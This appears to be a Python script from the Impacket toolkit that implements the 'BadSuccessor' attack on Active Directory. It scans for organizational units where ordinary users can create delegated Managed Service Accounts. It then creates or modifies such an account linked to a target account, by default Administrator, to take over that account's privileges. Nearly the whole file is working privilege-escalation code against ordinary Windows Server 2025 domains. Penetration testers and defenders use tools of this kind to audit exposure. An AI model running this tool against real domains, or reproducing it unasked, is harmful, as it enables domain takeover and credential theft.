#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script is a tool for dMSA exploitation.
#   Search function is based on AKAMAI Get-BadSuccessorOUPermissions.ps1
#   (https://github.com/akamai/BadSuccessor/blob/main/Get-BadSuccessorOUPermissions.ps1)
#   It allows to add/delete Delegated Managed Service Accounts (dMSA) in a
#   specific OU, search for OUs vulnerable to BadSuccessor attack.
#
# Notes:
#   Patched to avoid ldap3 binds for LDAP/389 and use Impacket LDAPConnection
#   instead, so LDAP signing/sealing works against DCs that require it. Re-implemented other 
#   aspects to get out of the use of ldap3 without compromising on stability/need
#   We have also successfully removed ldap3 search scope argument providers:
# 
#   ldap3.BASE → 0, ldap3.LEVEL → 1, ldap3.SUBTREE → 2
#   
#
# Author:
#   Ilya Yatsenko (@fulc2um)

from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import argparse
import hashlib
import logging
import random
import string
import sys
from pyasn1.codec.ber import encoder
from pyasn1.type import namedtype, univ

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_identity, parse_target
from impacket.ldap import ldap, ldaptypes, ldapasn1
from impacket.ldap.ldapasn1 import SearchResultEntry


class SDFlagsRequestValue(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('Flags', univ.Integer())
    )


def security_descriptor_control(sdflags=0x5):
    control_value = SDFlagsRequestValue()
    control_value.setComponentByName('Flags', sdflags)

    control = ldapasn1.Control()
    control['controlType'] = '1.2.840.113556.1.4.801'
    control['criticality'] = True
    control['controlValue'] = encoder.encode(control_value)
    return [control]


class LDAPAttributeAdapter(object):
    def __init__(self, values=None, raw_values=None):
        self.values = values if values is not None else []
        self.raw_values = raw_values if raw_values is not None else []
        self.value = self.values[0] if self.values else None

    def __iter__(self):
        return iter(self.values)

    def __len__(self):
        return len(self.values)

    def __str__(self):
        return str(self.value)


class LDAPEntryAdapter(object):
    def __init__(self, dn, attrs):
        self.entry_dn = dn
        self._attrs = attrs

    def __contains__(self, item):
        return item in self._attrs

    def __getitem__(self, item):
        return self._attrs[item]

    def __getattr__(self, item):
        if item in self._attrs:
            return self._attrs[item]
        raise AttributeError(item)

    def __str__(self):
        return self.entry_dn


class LDAPConnectionAdapter(object):
    _BINARY_ATTRS = {
        'objectSid',
        'nTSecurityDescriptor',
        'msDS-GroupMSAMembership',
        'msDS-ManagedPassword',
    }

    def __init__(self, connection):
        self._conn = connection
        self.entries = []
        self.result = None
        self.bound = True

    def _scope(self, search_scope):
        # Implemented our own custom function to replace the one prior using ldap3. We wanna weed it out
        # 0: baseObject, 1: singleLevel, 2: wholeSubtree
        scopes = {
            0: 'baseObject',
            1: 'singleLevel',
            2: 'wholeSubtree'
        }
        # Default to wholeSubtree (2) if an invalid scope is passed
        return ldapasn1.Scope(scopes.get(search_scope, 'wholeSubtree'))
    
    def _extract_raw_vals(self, attribute):
        out = []
        for value in attribute['vals']:
            try:
                out.append(value.asOctets())
            except Exception:
                try:
                    out.append(bytes(value))
                except Exception:
                    out.append(str(value).encode('utf-8'))
        return out

    def _decode_value(self, attr_name, raw_value):
        if attr_name in self._BINARY_ATTRS:
            return raw_value
        try:
            return raw_value.decode('utf-8')
        except Exception:
            return raw_value

    def _convert_entry(self, result_entry):
        dn = str(result_entry['objectName'])
        attrs = {}
        for attribute in result_entry['attributes']:
            attr_name = str(attribute['type'])
            raw_vals = self._extract_raw_vals(attribute)
            vals = [self._decode_value(attr_name, rv) for rv in raw_vals]
            attrs[attr_name] = LDAPAttributeAdapter(vals, raw_vals)
        return LDAPEntryAdapter(dn, attrs)

    #Some food for thought is when we use search_scope, instead of passing op codes. We could use impackets conventions for;
    # mods = {'description': [(MODIFY_REPLACE, ['new value'])]} Could be smth to discuss
    def search(self, search_base=None, search_filter='(objectClass=*)', search_scope=2, #replaced ldap3.SUBTREE as an agrument with 2
               attributes=None, controls=None):
        if attributes is None:
            attributes = []
        if search_base is None:
            search_base = ''

        try:
            response = self._conn.search(
                searchBase=search_base,
                scope=self._scope(search_scope),
                searchFilter=search_filter,
                attributes=attributes,
                searchControls=controls,
            )
            self.entries = [
                self._convert_entry(entry)
                for entry in response
                if isinstance(entry, SearchResultEntry)
            ]
            self.result = {'description': 'success'}
            return True
        except Exception as e:
            self.entries = []
            self.result = {'description': 'error', 'message': str(e)}
            return False

    def add(self, dn, object_class=None, attributes=None):
        attributes = dict(attributes or {})
        if object_class is None:
            object_class = attributes.pop('objectClass', ['top'])
        elif isinstance(object_class, str):
            object_class = [object_class]

        try:
            self._conn.add(dn, object_class, attributes)
            self.result = {'description': 'success'}
            return True
        except Exception as e:
            self.result = {'description': 'error', 'message': str(e)}
            return False

    def modify(self, dn, modifications):
        try:
            self._conn.modify(dn, modifications)
            self.result = {'description': 'success'}
            return True
        except Exception as e:
            self.result = {'description': 'error', 'message': str(e)}
            return False

    def delete(self, dn):
        try:
            self._conn.delete(dn)
            self.result = {'description': 'success'}
            return True
        except Exception as e:
            self.result = {'description': 'error', 'message': str(e)}
            return False

    def unbind(self):
        self.bound = False
        try:
            self._conn.close()
        except Exception:
            pass


class BADSUCCESSOR:
    def __init__(self, username, password, domain, lmhash, nthash, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = lmhash
        self.__nthash = nthash
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__target = cmdLineOptions.dc_host
        self.__kdcHost = cmdLineOptions.dc_host
        self.__dmsaName = cmdLineOptions.dmsa_name
        self.__method = cmdLineOptions.method
        self.__port = cmdLineOptions.port
        self.__action = cmdLineOptions.action
        self.__targetIp = cmdLineOptions.dc_ip
        self.__baseDN = cmdLineOptions.baseDN
        self.__targetOu = cmdLineOptions.target_ou
        self.__principalsAllowed = cmdLineOptions.principals_allowed
        self.__targetAccount = cmdLineOptions.target_account
        self.__dnsHostName = cmdLineOptions.dns_hostname

        if self.__targetIp is not None:
            self.__kdcHost = self.__targetIp

        if self.__method not in ['LDAP', 'LDAPS']:
            raise ValueError('Unsupported method %s' % self.__method)

        if self.__doKerberos and cmdLineOptions.dc_host is None:
            raise ValueError('Kerberos auth requires DNS name of the target DC. Use -dc-host.')

        if self.__method == 'LDAPS' and '.' not in self.__domain:
            logging.warning('\'%s\' doesn\'t look like a FQDN. Generating baseDN will probably fail.' % self.__domain)

        if self.__target is None:
            if '.' not in self.__domain:
                logging.warning('No DC host set and \'%s\' doesn\'t look like a FQDN. DNS resolution of short names will probably fail.' % self.__domain)
            self.__target = self.__domain

        if self.__port is None:
            if self.__method == 'LDAP':
                self.__port = 389
            elif self.__method == 'LDAPS':
                self.__port = 636

    def _ldap_connect(self):
        use_ldaps = (self.__method == 'LDAPS')
        target_host = self.__target if self.__target else self.__domain

        # Keep the hostname in the URL for SPN purposes, but use dc_ip as the
        # actual socket destination when the user supplied it.
        url = '%s://%s' % ('ldaps' if use_ldaps else 'ldap', target_host)
        raw_conn = ldap.LDAPConnection(url, self.__baseDN, self.__targetIp)

        if self.__doKerberos:
            raw_conn.kerberosLogin(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
                kdcHost=self.__kdcHost,
            )
        else:
            # Default Impacket LDAPConnection.login() uses SASL/GSS-SPNEGO for NTLM,
            # which enables LDAP signing/sealing on LDAP/389.
            raw_conn.login(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
            )

        return LDAPConnectionAdapter(raw_conn)

    def run(self):
        if self.__baseDN is None:
            domainParts = self.__domain.split('.')
            self.__baseDN = ''
            for i in domainParts:
                self.__baseDN += 'dc=%s,' % i
            self.__baseDN = self.__baseDN[:-1]

        try:
            ldapConnection = self._ldap_connect()
        except Exception as e:
            raise Exception('Could not connect to LDAP server: %s' % str(e))

        connectTo = self.__targetIp if self.__targetIp else (self.__target if self.__target else self.__domain)
        logging.info('Connected to %s as %s\\%s' % (connectTo, self.__domain, self.__username))
        if self.__method == 'LDAP':
            logging.info('Using LDAP with NTLM/Kerberos signing+sealing via Impacket')#This was simply added for my own debugging purposes
        else:
            logging.info('Using LDAPS')

        if self.__action == 'add':
            result = self.add_dmsa(ldapConnection)
        elif self.__action == 'delete':
            result = self.delete_dmsa(ldapConnection)
        elif self.__action == 'modify':
            result = self.modify_dmsa(ldapConnection)
        elif self.__action == 'search':
            result = self.search_ous(ldapConnection)
        else:
            logging.error('Unknown action: %s' % self.__action)
            result = False

        ldapConnection.unbind()
        return result

    def delete_dmsa(self, ldapConnection):
        try:
            if not self.__dmsaName:
                logging.error('dMSA name is required for deletion. Use -dmsa-name parameter.')
                return False

            if not self.__targetOu:
                logging.error('Target OU is required for dMSA deletion. Use -target-ou parameter.')
                return False

            dmsa_dn = 'CN=%s,%s' % (self.__dmsaName, self.__targetOu)
            if not self.check_account_exists(ldapConnection, dmsa_dn):
                logging.error('dMSA account does not exist: %s' % dmsa_dn)
                return False

            success = ldapConnection.delete(dmsa_dn)

            logging.info('')
            logging.info('%-30s %s' % ('dMSA Deletion Results', ''))
            logging.info('%-30s %s' % ('-' * 30, '-' * 30))
            logging.info('%-30s %s' % ('dMSA Name:', '%s$' % self.__dmsaName))
            logging.info('%-30s %s' % ('Status:', 'SUCCESS' if success else 'FAILED'))

            if not success and ldapConnection.result:
                logging.error('%-30s %s' % ('Error:', ldapConnection.result))

            return success

        except Exception as e:
            logging.error('dMSA deletion failed: %s' % str(e))
            return False

    def check_account_exists(self, ldapConnection, dn):
        try:
            success = ldapConnection.search(
                search_base=dn,
                search_filter='(objectClass=*)',
                search_scope=0,
                attributes=['cn']
            )
            return success and len(ldapConnection.entries) > 0
        except Exception as e:
            logging.debug('Error checking account existence: %s' % str(e))
            return False

    def search_ous(self, ldapConnection):
        try:
            logging.info('Searching for OUs vulnerable to BadSuccessor attack...')

            if not ldapConnection.bound:
                logging.error('LDAP connection is not bound')
                return False

            success = ldapConnection.search(
                search_base=self.__baseDN,
                search_filter='(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
                search_scope=2, #replaced the argument from ldap3.SUBTREE to 2
                attributes=['operatingSystem', 'operatingSystemVersion']
            )

            if not success:
                logging.error('Failed to search for Domain Controllers: %s' % ldapConnection.result)
                return False

            prereq_flag = False
            for entry in ldapConnection.entries:
                if 'operatingSystem' not in entry or 'operatingSystemVersion' not in entry:
                    logging.error('Could not retrieve operating system information for Domain Controller: %s' % entry.entry_dn)
                else:
                    os_name = entry.operatingSystem.value or ''
                    os_ver = entry.operatingSystemVersion.value or ''
                    if 'Windows Server 2025' in os_name or '26100' in os_ver:
                        logging.info('Found Windows Server 2025 Domain Controller: %s' % entry.entry_dn)
                        prereq_flag = True
                        break

            if not prereq_flag:
                logging.info('No Windows Server 2025 Domain Controllers found. This script requires at least one DC running Windows Server 2025.')
                logging.info('Resulting list of Identities/OUs will show Identities that have permissions to create objects in OUs.')

            success = ldapConnection.search(
                search_base=self.__baseDN,
                search_filter='(objectClass=organizationalUnit)',
                search_scope=2,
                attributes=['distinguishedName', 'nTSecurityDescriptor'],
                controls=security_descriptor_control(sdflags=0x5)
            )

            if not success:
                logging.error('Failed to search for organizational units: %s' % ldapConnection.result)
                return False

            ou_entries = list(ldapConnection.entries)
            logging.info('Found %d organizational units' % len(ou_entries))

            domain_sid = None
            try:
                success = ldapConnection.search(
                    search_base=self.__baseDN,
                    search_filter='(objectClass=domain)',
                    search_scope=0,
                    attributes=['objectSid']
                )

                if success and len(ldapConnection.entries) > 0:
                    entry = ldapConnection.entries[0]
                    if 'objectSid' in entry:
                        domain_sid = self.convert_sid_to_string(entry.objectSid.value)
            except Exception as e:
                logging.error('Failed to retrieve domain SID: %s' % str(e))
                return False

            allowed_identities = {}
            relevant_rights = {
                'CreateChild': 0x00000001,
                'GenericAll': 0x10000000,
                'WriteDACL': 0x00040000,
                'WriteOwner': 0x00080000
            }
            relevant_object_types = {
                '00000000-0000-0000-0000-000000000000': 'All Objects',
                '0feb936f-47b3-49f2-9386-1dedc2c23765': 'msDS-DelegatedManagedServiceAccount',
            }

            for entry in ou_entries:
                try:
                    ou_dn = str(entry.entry_dn)

                    if 'nTSecurityDescriptor' not in entry or not entry.nTSecurityDescriptor.value:
                        continue

                    sd_data = entry.nTSecurityDescriptor.value
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)

                    dacl = sd['Dacl']
                    if dacl and hasattr(dacl, 'aces') and dacl.aces:
                        for ace in dacl.aces:
                            if ace['AceType'] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
                                continue

                            mask = int(ace['Ace']['Mask']['Mask'])
                            has_relevant_right = any(mask & right_value for right_value in relevant_rights.values())
                            if not has_relevant_right:
                                continue

                            object_type = getattr(ace['Ace'], 'ObjectType', None)
                            if object_type:
                                object_guid = str(object_type).lower()
                                if object_guid not in relevant_object_types:
                                    continue

                            sid = ace['Ace']['Sid'].formatCanonical()
                            if self.is_excluded_sid(sid, domain_sid):
                                continue

                            identity = self.resolve_sid_to_name(ldapConnection, sid)
                            if identity not in allowed_identities:
                                allowed_identities[identity] = []
                            if ou_dn not in allowed_identities[identity]:
                                allowed_identities[identity].append(ou_dn)

                    try:
                        owner_sid = sd['OwnerSid'].formatCanonical()
                        if not self.is_excluded_sid(owner_sid, domain_sid):
                            identity = self.resolve_sid_to_name(ldapConnection, owner_sid)
                            if identity not in allowed_identities:
                                allowed_identities[identity] = []
                            if ou_dn not in allowed_identities[identity]:
                                allowed_identities[identity].append(ou_dn)
                    except Exception:
                        pass

                except Exception:
                    continue

            if allowed_identities:
                logging.info('Found %d identities with BadSuccessor privileges:' % len(allowed_identities))
                logging.info('')
                logging.info('%-50s %s' % ('Identity', 'Vulnerable OUs'))
                logging.info('%-50s %s' % ('-' * 50, '-' * 30))
                for identity, ous in allowed_identities.items():
                    ou_list = '{%s}' % ', '.join(ous)
                    logging.info('%-50s %s' % (identity[:50], ou_list))
            else:
                logging.info('No identities found with BadSuccessor privileges')
                logging.info('')
                logging.info('%-50s %s' % ('Identity', 'Vulnerable OUs'))
                logging.info('%-50s %s' % ('-' * 50, '-' * 30))
                logging.info('%-50s %s' % ('(none)', '(none)'))
            return True

        except Exception as e:
            logging.error('BadSuccessor search failed: %s' % str(e))
            return False

    def is_excluded_sid(self, sid, domain_sid):
        excluded_sids = ['S-1-5-32-544', 'S-1-5-18']
        excluded_suffixes = ['-512', '-519']

        if sid in excluded_sids:
            return True

        if domain_sid and sid.startswith(domain_sid):
            for suffix in excluded_suffixes:
                if sid.endswith(suffix):
                    return True

        return False

    def resolve_sid_to_name(self, ldapConnection, sid):
        try:
            well_known_sids = {
                'S-1-1-0': 'Everyone',
                'S-1-5-11': 'NT AUTHORITY\\Authenticated Users',
                'S-1-5-32-544': 'BUILTIN\\Administrators',
                'S-1-5-32-545': 'BUILTIN\\Users',
                'S-1-5-32-546': 'BUILTIN\\Guests',
                'S-1-5-18': 'NT AUTHORITY\\SYSTEM',
                'S-1-5-19': 'NT AUTHORITY\\LOCAL SERVICE',
                'S-1-5-20': 'NT AUTHORITY\\NETWORK SERVICE',
                'S-1-3-0': 'CREATOR OWNER',
                'S-1-3-1': 'CREATOR GROUP',
                'S-1-5-9': 'NT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS',
                'S-1-5-10': 'NT AUTHORITY\\SELF',
            }

            if sid in well_known_sids:
                return well_known_sids[sid]

            success = ldapConnection.search(
                search_base=self.__baseDN,
                search_filter='(objectSid=%s)' % sid,
                search_scope=2,
                attributes=['sAMAccountName']
            )

            if success and len(ldapConnection.entries) > 0:
                entry = ldapConnection.entries[0]
                if 'sAMAccountName' in entry:
                    username = entry.sAMAccountName.value
                    return '%s\\%s' % (self.__domain.upper(), username)

            return sid

        except Exception as e:
            logging.debug('Error resolving SID %s: %s' % (sid, str(e)))
            return sid

    def generate_dmsa_name(self):
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        return 'dMSA-%s' % random_suffix

    def convert_sid_to_string(self, sid_bytes):
        try:
            if not sid_bytes:
                return None

            if isinstance(sid_bytes, str):
                return sid_bytes if sid_bytes.startswith('S-') else None

            if len(sid_bytes) < 8:
                return None

            revision = sid_bytes[0]
            authority_count = sid_bytes[1]
            expected_length = 8 + (authority_count * 4)
            if len(sid_bytes) < expected_length:
                return None

            authority = int.from_bytes(sid_bytes[2:8], 'big')
            subauthorities = []
            for i in range(authority_count):
                offset = 8 + (i * 4)
                if offset + 4 <= len(sid_bytes):
                    subauth = int.from_bytes(sid_bytes[offset:offset + 4], 'little')
                    subauthorities.append(str(subauth))
                else:
                    break

            if subauthorities:
                sid_string = 'S-%d-%d-%s' % (revision, authority, '-'.join(subauthorities))
            else:
                sid_string = 'S-%d-%d' % (revision, authority)

            return sid_string

        except Exception as e:
            logging.debug('Error converting SID bytes to string: %s' % str(e))
            return None

    def build_security_descriptor(self, user_sid):
        try:
            if not user_sid:
                return None

            if isinstance(user_sid, str):
                if user_sid.startswith('S-'):
                    sid_string = user_sid
                else:
                    return None
            else:
                sid_string = self.convert_sid_to_string(user_sid)
                if not sid_string:
                    return None

            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
            sd['Revision'] = b'\x01'
            sd['Sbz1'] = b'\x00'
            sd['Control'] = 32772
            sd['OwnerSid'] = ldaptypes.LDAP_SID()
            sd['OwnerSid'].fromCanonical(sid_string)
            sd['GroupSid'] = b''
            sd['Sacl'] = b''

            acl = ldaptypes.ACL()
            acl['AclRevision'] = 4
            acl['Sbz1'] = 0
            acl['Sbz2'] = 0
            acl.aces = []

            nace1 = ldaptypes.ACE()
            nace1['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
            nace1['AceFlags'] = 0x00
            acedata1 = ldaptypes.ACCESS_ALLOWED_ACE()
            acedata1['Mask'] = ldaptypes.ACCESS_MASK()
            acedata1['Mask']['Mask'] = 0x000F01FF
            acedata1['Sid'] = ldaptypes.LDAP_SID()
            acedata1['Sid'].fromCanonical(sid_string)
            nace1['Ace'] = acedata1
            acl.aces.append(nace1)

            nace2 = ldaptypes.ACE()
            nace2['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
            nace2['AceFlags'] = 0x00
            acedata2 = ldaptypes.ACCESS_ALLOWED_ACE()
            acedata2['Mask'] = ldaptypes.ACCESS_MASK()
            acedata2['Mask']['Mask'] = 0x10000000
            acedata2['Sid'] = ldaptypes.LDAP_SID()
            acedata2['Sid'].fromCanonical(sid_string)
            nace2['Ace'] = acedata2
            acl.aces.append(nace2)

            sd['Dacl'] = acl
            return sd.getData()

        except Exception as e:
            logging.debug('Error building security descriptor: %s' % str(e))
            return None

    def add_dmsa(self, ldapConnection):
        try:
            if not self.__dmsaName:
                self.__dmsaName = self.generate_dmsa_name()

            if not self.__targetOu:
                logging.error('Target OU is required for dMSA creation. Use -target-ou parameter.')
                return False

            dmsa_dn = 'CN=%s,%s' % (self.__dmsaName, self.__targetOu)
            if self.check_account_exists(ldapConnection, dmsa_dn):
                logging.error('dMSA account already exists: %s' % dmsa_dn)
                return False

            principals_allowed = self.__principalsAllowed if self.__principalsAllowed else self.__username
            target_account = self.__targetAccount if self.__targetAccount else 'Administrator'
            dns_hostname = self.__dnsHostName if self.__dnsHostName else '%s.%s' % (self.__dmsaName.lower(), self.__domain)

            if not dns_hostname or '.' not in dns_hostname:
                dns_hostname = '%s.%s' % (self.__dmsaName.lower(), self.__domain)

            attributes = {
                'objectClass': ['msDS-DelegatedManagedServiceAccount'],
                'cn': self.__dmsaName,
                'sAMAccountName': '%s$' % self.__dmsaName,
                'dNSHostName': dns_hostname,
                'userAccountControl': 4096,
                'msDS-ManagedPasswordInterval': 30,
                'msDS-DelegatedMSAState': 2,
                'msDS-SupportedEncryptionTypes': 28,
                'accountExpires': 9223372036854775807,
            }

            group_msa_membership = None
            try:
                search_filter = '(&(objectClass=user)(sAMAccountName=%s))' % principals_allowed
                success = ldapConnection.search(
                    search_base=self.__baseDN,
                    search_filter=search_filter,
                    search_scope=2,
                    attributes=['objectSid']
                )
                if success and len(ldapConnection.entries) > 0:
                    entry = ldapConnection.entries[0]
                    if 'objectSid' in entry:
                        user_sid = entry.objectSid.value
                        if user_sid:
                            descriptor = self.build_security_descriptor(user_sid)
                            group_msa_membership = descriptor
                            attributes['nTSecurityDescriptor'] = descriptor
            except Exception as e:
                logging.debug('Error building MSA membership: %s' % str(e))
                return False

            if group_msa_membership:
                attributes['msDS-GroupMSAMembership'] = group_msa_membership

            target_dn = None
            success = ldapConnection.search(
                search_base=self.__baseDN,
                search_filter='(&(objectClass=*)(sAMAccountName=%s))' % target_account,
                search_scope=2,
                attributes=['distinguishedName', 'objectClass']
            )

            if success and len(ldapConnection.entries) > 0:
                for entry in ldapConnection.entries:
                    object_classes = [str(oc).lower() for oc in entry.objectClass.values]
                    if 'user' in object_classes or 'computer' in object_classes:
                        target_dn = str(entry.entry_dn)
                        break
                if not target_dn:
                    target_dn = str(ldapConnection.entries[0].entry_dn)

                if target_dn:
                    attributes['msDS-ManagedAccountPrecededByLink'] = target_dn
            else:
                logging.error('Target account not found: %s' % target_account)
                return False

            success = ldapConnection.add(dmsa_dn, attributes=attributes)

            if success:
                logging.info('')
                logging.info('%-30s %s' % ('-' * 30, '-' * 30))
                logging.info('%-30s %s' % ('dMSA Name:', '%s$' % self.__dmsaName))
                logging.info('%-30s %s' % ('DNS Hostname:', attributes.get('dNSHostName', 'Unknown')))
                logging.info('%-30s %s' % ('Migration status: ', attributes.get('msDS-DelegatedMSAState', 'Unknown')))
                logging.info('%-30s %s' % ('Principals Allowed:', principals_allowed))
                logging.info('%-30s %s' % ('Target Account:', target_account))
                return True
            else:
                if ldapConnection.result:
                    logging.error('LDAP error: %s' % ldapConnection.result)
                return False

        except Exception as e:
            logging.error('dMSA creation failed: %s' % str(e))
            return False

    def modify_dmsa(self, ldapConnection):
        try:
            dmsa_dn = 'CN=%s,%s' % (self.__dmsaName, self.__targetOu)

            if not self.check_account_exists(ldapConnection, dmsa_dn):
                logging.error('dMSA account does not exist: %s' % dmsa_dn)
                return False

            success = ldapConnection.search(
                search_base=dmsa_dn,
                search_filter='(objectClass=msDS-DelegatedManagedServiceAccount)',
                search_scope=0,
                attributes=['msDS-ManagedAccountPrecededByLink']
            )

            current_target_dn = None
            if success and len(ldapConnection.entries) > 0:
                entry = ldapConnection.entries[0]
                if 'msDS-ManagedAccountPrecededByLink' in entry:
                    current_target_dn = entry['msDS-ManagedAccountPrecededByLink'].value

            success = ldapConnection.search(
                search_base=self.__baseDN,
                search_filter='(&(objectClass=*)(sAMAccountName=%s))' % self.__targetAccount,
                search_scope=2,
                attributes=['distinguishedName', 'objectClass']
            )

            if not (success and len(ldapConnection.entries) > 0):
                logging.error('Target account not found: %s' % self.__targetAccount)
                return False

            target_dn = None
            for entry in ldapConnection.entries:
                object_classes = [str(oc).lower() for oc in entry.objectClass.values]
                if 'user' in object_classes or 'computer' in object_classes:
                    target_dn = str(entry.entry_dn)
                    break

            if not target_dn:
                target_dn = str(ldapConnection.entries[0].entry_dn)

            if current_target_dn == target_dn:
                logging.info('Target account is already set to: %s' % target_dn)
                logging.info('No modifications needed.')
                return True

            modifications = {
                'msDS-ManagedAccountPrecededByLink': [(2, [target_dn])]
            }

            success = ldapConnection.modify(dmsa_dn, modifications)

            if success:
                logging.info('dMSA target account modified: %s -> %s' % (current_target_dn or '(not set)', target_dn))
                return True
            else:
                logging.error('Failed to modify dMSA: %s' % ldapConnection.result)
                return False

        except Exception as e:
            logging.error('Error modifying dMSA: %s' % str(e))
            return False


if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description='dMSA exploitation tool.')

    parser.add_argument('account', action='store', metavar='[domain/]username[:password]@DCHostOrIP', help='Account used to authenticate to DC.')
    parser.add_argument('-dmsa-name', action='store', metavar='dmsa_name', help='Name of dMSA to add. If omitted, a random dMSA-[A-Z0-9]{8} will be used.')
    parser.add_argument('-action', choices=['add', 'delete', 'modify', 'search'], default='search', help='Action to perform: add (requires -target-ou), delete (requires -dmsa-name, -target-ou), modify (requires -dmsa-name, -target-ou and -target-account), or search a dMSA.')
    parser.add_argument('-target-ou', action='store', metavar='OU_DN', help='Specific OU to check for dMSA creation capabilities (e.g., "OU=weakOU,DC=domain,DC=local")')
    parser.add_argument('-principals-allowed', action='store', metavar='USERNAME', help='Username allowed to retrieve the managed password. If omitted, current username will be used.')
    parser.add_argument('-target-account', action='store', metavar='USERNAME', default='Administrator', help='Target user or computer account DN to set for msDS-ManagedAccountPrecededByLink (can target Domain Controllers, Domain Admins, Protected Users, etc.)')
    parser.add_argument('-dns-hostname', action='store', metavar='HOSTNAME', help='DNS hostname for the dMSA. If omitted, will be generated as dmsaname.domain.')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-method', choices=['LDAP', 'LDAPS'], default='LDAPS', help='Method of adding the computer. LDAPS has some certificate requirements and isn\'t always available.')

    parser.add_argument('-port', type=int, choices=[389, 636], help='Destination port to connect to. LDAP defaults to 389, LDAPS to 636.')

    group = parser.add_argument_group('LDAP')
    group.add_argument('-baseDN', action='store', metavar='DC=test,DC=local', help='Set baseDN for LDAP. If omitted, the domain part (FQDN) specified in the account parameter will be used.')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action='store_true', help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on account parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
    group.add_argument('-aesKey', action='store', metavar='hex key', help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    group.add_argument('-dc-host', action='store', metavar='hostname', help='Hostname of the domain controller to use. If omitted, the domain part (FQDN) specified in the account parameter will be used')
    group.add_argument('-dc-ip', action='store', metavar='ip', help='IP of the domain controller to use. Useful if you can\'t translate the FQDN.')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.action == 'add':
        required_args = []
        if not options.target_ou:
            required_args.append('-target-ou')
        if required_args:
            parser.error('Action "add" requires the following arguments: %s' % ', '.join(required_args))

    elif options.action == 'delete':
        required_args = []
        if not options.dmsa_name:
            required_args.append('-dmsa-name')
        if not options.target_ou:
            required_args.append('-target-ou')
        if required_args:
            parser.error('Action "delete" requires the following arguments: %s' % ', '.join(required_args))

    elif options.action == 'modify':
        required_args = []
        if not options.dmsa_name:
            required_args.append('-dmsa-name')
        if not options.target_ou:
            required_args.append('-target-ou')
        if not options.target_account:
            required_args.append('-target-account')
        if required_args:
            parser.error('Action "modify" requires the following arguments: %s' % ', '.join(required_args))

    logger.init(options.ts, options.debug)

    if '@' in options.account and options.dc_host is None:
        domain, username, password, remote_host = parse_target(options.account)
        if domain == '':
            logging.critical('Domain should be specified!')
            sys.exit(1)
        options.dc_host = remote_host

        if password == '' and username != '' and options.hashes is None and not options.no_pass and options.aesKey is None:
            from getpass import getpass
            password = getpass('Password:')

        lmhash = ''
        nthash = ''
        if options.hashes is not None:
            lmhash, nthash = options.hashes.split(':')
            if lmhash == '':
                lmhash = 'AAD3B435B51404EEAAD3B435B51404EE'

        if options.aesKey is not None:
            options.k = True
    else:
        domain, username, password, lmhash, nthash, options.k = parse_identity(
            options.account,
            options.hashes,
            options.no_pass,
            options.aesKey,
            options.k,
        )

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    try:
        executer = BADSUCCESSOR(username, password, domain, lmhash, nthash, options)
        executer.run()
    except Exception as e:
        print(str(e))
